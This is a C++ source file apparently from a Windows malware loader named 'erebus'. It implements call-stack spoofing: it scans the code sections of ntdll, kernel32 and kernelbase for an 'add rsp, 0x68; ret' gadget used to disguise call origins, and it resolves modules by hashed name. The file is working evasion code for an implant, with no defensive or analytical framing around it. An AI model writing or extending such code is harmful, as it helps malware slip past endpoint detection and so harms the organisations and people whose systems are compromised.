#include "../../include/loader.hpp"
#include "../../include/evasion/callstack_spoof.hpp"

namespace erebus {
namespace evasion {

static PVOID g_spoof_gadget = NULL;
static BOOL  g_spoof_init   = FALSE;

// Search module .text for `add rsp, disp8; ret` (48 83 C4 <disp> C3).
// disp == 0x68 (104 bytes) matches our fixed stack layout in callstack_spoof.asm.
static PVOID FindAddRspRetGadget(HMODULE mod, BYTE disp)
{
    if (!mod) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)mod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Name[0] != '.' || sec->Name[1] != 't' ||
            sec->Name[2] != 'e' || sec->Name[3] != 'x' || sec->Name[4] != 't')
            continue;
        PBYTE  base = (PBYTE)mod + sec->VirtualAddress;
        SIZE_T size = sec->Misc.VirtualSize;
        for (SIZE_T off = 0; off + 5 <= size; off++) {
            if (base[off]   == 0x48 && base[off+1] == 0x83 &&
                base[off+2] == 0xC4 && base[off+3] == disp  &&
                base[off+4] == 0xC3)
                return (PVOID)(base + off);
        }
        break;
    }
    return NULL;
}

BOOL InitCallstackSpoof()
{
    if (g_spoof_init) return g_spoof_gadget != NULL;
    g_spoof_init = TRUE;

    // Search ntdll first; it has hundreds of `add rsp, N; ret` epilogues.
    // Fall through to kernel32/kernelbase if 0x68 not found (rare).
    static const ULONG mods[] = {
        H("ntdll.dll"), H("kernel32.dll"), H("kernelbase.dll")
    };
    for (int i = 0; i < 3 && !g_spoof_gadget; i++)
        g_spoof_gadget = FindAddRspRetGadget(GetModuleHandleC(mods[i]), 0x68);

    return g_spoof_gadget != NULL;
}

PVOID GetSpoofGadget()
{
    return g_spoof_gadget;
}

} // namespace evasion
} // namespace erebus
